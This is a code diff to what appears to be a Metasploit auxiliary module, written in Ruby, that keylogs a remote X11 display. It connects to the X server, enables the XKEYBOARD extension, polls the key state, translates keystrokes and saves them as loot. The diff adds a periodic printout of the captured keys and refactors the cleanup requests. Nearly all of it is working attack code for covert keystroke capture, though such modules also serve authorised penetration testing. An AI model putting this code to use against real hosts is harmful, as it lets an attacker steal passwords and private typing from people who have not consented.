@@ -53,7 +53,8 @@ class MetasploitModule < Msf::Auxiliary
       )
     )
     register_options [
-      OptInt.new('ListenerTimeout', [ true, 'The maximum number of seconds to keylog', 600 ]) # 10 minutes
+      OptInt.new('ListenerTimeout', [ true, 'The maximum number of seconds to keylog', 600 ]), # 10 minutes
+      OptInt.new('PRINTERVAL', [ true, 'The interval to print keyloggs in seconds', 60 ]) # 1 minutes
     ]
   end
 
@@ -107,7 +108,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   # TBH still don't really understand exactly how this works, but it does.
-  def print_keystroke(bit_array_of_keystrokes, key_map, last_key_press_array)
+  def translate_keystroke(bit_array_of_keystrokes, key_map, last_key_press_array)
     # Iterate through each byte of keyboard state
     bit_array_of_keystrokes.each_with_index do |keyboard_state_byte, byte_index|
       next if last_key_press_array[byte_index] == keyboard_state_byte
@@ -120,8 +121,9 @@ class MetasploitModule < Msf::Auxiliary
         keycode = byte_index * 8 + j
 
         keysym = key_map[keycode]
-        print_line(keysym)
+
         @keylogger_log += keysym
+        @keylogger_print_buffer += keysym
       end
     end
   end
@@ -129,6 +131,7 @@ class MetasploitModule < Msf::Auxiliary
   def run
     query_extension_calls = 0
     @keylogger_log = ''
+    @keylogger_print_buffer = ''
 
     vprint_status('Establishing TCP Connection')
     connect # tcp connection establish
@@ -194,16 +197,17 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     vprint_status('[6/9] Enabling XKEYBOARD')
-    sock.put(X11ExtensionToggleRequest.new(opcode: xkeyboard_plugin.major_opcode, wanted_major: 1).to_binary_s) # use keyboard
-    toggle = toggle_extension(xkeyboard_plugin.major_opcode)
+    toggle = toggle_extension(xkeyboard_plugin.major_opcode, wanted_major: 1)
     fail_with(Msf::Module::Failure::UnexpectedReply, 'Unable to enable extension') if toggle.nil?
 
     vprint_status('[7/9] Requesting XKEYBOARD map')
     sock.put(X11GetMapRequest.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
                                   full_key_types: 1,
                                   full_key_syms: 1,
-                                  full_modifier_map: 1).to_binary_s) # not sure what this does
-    map_data = X11GetMapReply.read(sock.get_once(-1, 1))
+                                  full_modifier_map: 1).to_binary_s)
+    data = sock.get_once(-1, 1)
+    # puts data.bytes.map { |b| "\\x" + b.to_s(16).rjust(2, '0') }.join
+    map_data = X11GetMapReply.read(data)
 
     vprint_status('[8/9] Enabling notification on keyboard and map')
     sock.put(X11SelectEvents.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
@@ -228,7 +232,9 @@ class MetasploitModule < Msf::Auxiliary
     print_good('All setup, watching for keystrokes')
     # loop mechanics stolen from exploit/multi/handler
     stime = Time.now.to_f
+    print_timer = Time.now.to_f
     timeout = datastore['ListenerTimeout'].to_i
+    printerval = datastore['PRINTERVAL'].to_i
     begin
       loop do
         break if timeout > 0 && (stime + timeout < Time.now.to_f)
@@ -236,16 +242,34 @@ class MetasploitModule < Msf::Auxiliary
         sock.put(X11QueryKeyMapRequest.new.to_binary_s)
         bit_array_of_keystrokes = X11QueryKeyMapReply.read(sock.get_once(-1, 1)).data
         # we poll FAR quicker than a normal key press, so we need to filter repeats
-        next if bit_array_of_keystrokes == last_key_press_array # skip repeats
+        unless bit_array_of_keystrokes == last_key_press_array # skip repeats
+          translate_keystroke(bit_array_of_keystrokes, key_map, last_key_press_array) unless bit_array_of_keystrokes == empty
+          last_key_press_array = bit_array_of_keystrokes
+        end
 
-        print_keystroke(bit_array_of_keystrokes, key_map, last_key_press_array) unless bit_array_of_keystrokes == empty
-        last_key_press_array = bit_array_of_keystrokes
+        next unless print_timer + printerval < Time.now.to_f
+
+        print_timer = Time.now.to_f
+        if @keylogger_print_buffer.empty?
+          print_bad('No X11 key presses observed')
+          next
+        end
+        print_good("X11 Key presses observed: #{@keylogger_print_buffer}")
+        @keylogger_print_buffer = ''
       end
     ensure
       vprint_status('Closing X11 connection')
-      sock.put(X11FreeGraphicalContextRequest.new(gc: connection.body.resource_id_base).to_binary_s +
-        X11GetInputFocusRequest.new.to_binary_s)
+      sock.put(Rex::Proto::X11::X11RequestHeader.new(opcode: 60).to_binary_s +
+        X11FreeGraphicalContextRequestBody.new(gc: connection.body.resource_id_base).to_binary_s +
+        Rex::Proto::X11::X11RequestHeader.new(opcode: 43).to_binary_s +
+        X11GetInputFocusRequestBody.new.to_binary_s)
       disconnect
+
+      if @keylogger_print_buffer.empty?
+        print_bad('No X11 key presses observed')
+      else
+        print_good("X11 Key presses observed: #{@keylogger_print_buffer}")
+      end
 
       unless @keylogger_log == ''
         loot_path = store_loot(
